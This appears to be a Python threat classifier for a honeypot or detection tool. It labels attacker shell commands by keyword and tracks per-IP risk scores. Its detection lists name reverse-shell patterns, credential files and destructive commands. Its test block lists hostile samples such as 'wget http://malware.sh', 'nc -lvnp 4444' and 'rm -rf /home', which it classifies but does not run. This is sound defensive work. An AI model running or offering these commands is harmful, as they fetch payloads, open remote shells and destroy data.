import uuid
from datetime import datetime

# Risk Score Mapping
RISK_SCORES = {
    "Reconnaissance": 3,
    "Privilege Enumeration": 5,
    "System Enumeration": 4,
    "Network/User Enumeration": 4,
    "Malware Download Attempt": 8,
    "Privilege Escalation Attempt": 10,
    "Persistence Attempt": 12,
    "Reverse Shell Attempt": 15,
    "C2 / Backdoor Attempt": 18,
    "System Destruction Attempt": 20,
    "Suspicious Script Execution": 7,
    "Unknown": 1
}


class AttackerSession:
    def __init__(self, ip):
        self.session_id = str(uuid.uuid4())[:8]
        self.ip = ip
        self.start_time = datetime.now()
        self.commands = []
        self.risk_score = 0
        self.threat_level = "LOW"

    def add_command(self, command, attack_type):
        self.commands.append(command)
        score_add = RISK_SCORES.get(attack_type, 1)
        self.risk_score += score_add
        
        # Update Threat Level
        if self.risk_score >= 40:
            self.threat_level = "CRITICAL"
        elif self.risk_score >= 25:
            self.threat_level = "HIGH"
        elif self.risk_score >= 12:
            self.threat_level = "MEDIUM"
        else:
            self.threat_level = "LOW"

        return {
            "session_id": self.session_id,
            "ip": self.ip,
            "attack_type": attack_type,
            "risk_score": self.risk_score,
            "threat_level": self.threat_level,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }


# Global session store (for demo)
sessions = {}


def classify_command(command: str, ip: str = "192.168.1.100") -> dict:
    """
    Advanced Threat Classification with Session ID and Risk Scoring
    """
    if not command or not isinstance(command, str):
        return {"attack_type": "Unknown", "risk_score": 0, "threat_level": "LOW"}

    cmd = command.lower().strip()

    # CLASSIFICATION 
    if any(x in cmd for x in ["nmap", "masscan", "rustscan", "netdiscover", "arp-scan", "ping", "traceroute"]):
        attack_type = "Reconnaissance"
    elif any(x in cmd for x in ["/etc/passwd", "/etc/shadow", "id ", "sudo -l", "cat /etc/"]):
        attack_type = "Privilege Enumeration"
    elif any(x in cmd for x in ["ls -la", "find /", "uname -a"]):
        attack_type = "System Enumeration"
    elif any(x in cmd for x in ["netstat", "ss ", "ps aux"]):
        attack_type = "Network/User Enumeration"
    elif any(x in cmd for x in ["wget ", "curl -O", "git clone"]):
        attack_type = "Malware Download Attempt"
    elif any(x in cmd for x in ["sudo ", "su ", "pkexec", "chmod +s"]):
        attack_type = "Privilege Escalation Attempt"
    elif any(x in cmd for x in ["crontab", "authorized_keys", ".bashrc"]):
        attack_type = "Persistence Attempt"
    elif any(x in cmd for x in ["nc -lvnp", "bash -i >& /dev/tcp", "reverse shell"]):
        attack_type = "Reverse Shell Attempt"
    elif any(x in cmd for x in ["rm -rf", "dd if=", "> /dev/sda"]):
        attack_type = "System Destruction Attempt"
    else:
        attack_type = "Unknown"

    # Create or get session
    if ip not in sessions:
        sessions[ip] = AttackerSession(ip)

    # Add command and get decision
    decision = sessions[ip].add_command(command, attack_type)

    return {
        "session_id": decision["session_id"],
        "ip": ip,
        "command": command,
        "attack_type": attack_type,
        "risk_score": decision["risk_score"],
        "threat_level": decision["threat_level"],
        "timestamp": decision["timestamp"]
    }


# TESTING 
if __name__ == "__main__":
    print("=== Xynera Threat Classification with Session & Risk Score ===\n")
    
    test_commands = [
        "nmap -sV 192.168.1.0/24",
        "cat /etc/passwd",
        "wget http://malware.sh",
        "sudo su",
        "crontab -e",
        "nc -lvnp 4444",
        "ls -la",
        "rm -rf /home"
    ]

    for cmd in test_commands:
        result = classify_command(cmd, ip="192.168.1.100")
        print(f"Session ID : {result['session_id']}")
        print(f"Command    : {result['command']}")
        print(f"Attack Type: {result['attack_type']}")
        print(f"Risk Score : {result['risk_score']}")
        print(f"Threat     : {result['threat_level']}")
        print("-" * 70)
